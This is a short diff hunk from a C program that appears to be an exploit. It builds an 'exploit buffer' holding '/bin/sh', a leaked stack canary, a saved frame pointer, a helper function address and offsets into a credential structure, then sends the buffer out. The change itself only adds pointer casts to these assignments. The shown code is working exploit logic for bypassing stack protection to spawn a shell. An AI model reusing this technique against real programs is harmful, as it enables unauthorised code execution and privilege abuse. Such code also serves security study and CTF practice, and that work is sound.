@@ -63,14 +63,14 @@ int main(int argc, char* argv[]) {
 
 	// Now initialize the parts of the exploit buffer that really matter
 	strcpy((char *)expl, "/bin/sh");
-	expl[auth_bp_cred_dist/sizeof(void *)]	= cur_phelper_addr;
-	expl[auth_bp_cred_dist/sizeof(void *) - 1]	= cur_g_bp;
-	expl[auth_bp_cred_dist/sizeof(void *) - 2]	= canary;
+	expl[auth_bp_cred_dist/sizeof(void *)]		= (void *) cur_phelper_addr;
+	expl[auth_bp_cred_dist/sizeof(void *) - 1]	= (void *) cur_g_bp;
+	expl[auth_bp_cred_dist/sizeof(void *) - 2]	= (void *) canary;
 
 
-	expl[g_bp_cred_dist/sizeof(void *) - 2] = 0x1234567000000000;
-	expl[g_bp_cred_dist/sizeof(void *) - 3] = 0x123456789abcdef0;
-	expl[g_bp_cred_dist/sizeof(void *) - 4] = cur_cred + sizeof(char *);
+	expl[g_bp_cred_dist/sizeof(void *) - 2] = (void *) 0x1234567000000000;
+	expl[g_bp_cred_dist/sizeof(void *) - 3] = (void *) 0x123456789abcdef0;
+	expl[g_bp_cred_dist/sizeof(void *) - 4] = (void *) (cur_cred + sizeof(char *));
 
 	put_str("u ");
 	put_bin((char*)expl, explsz);
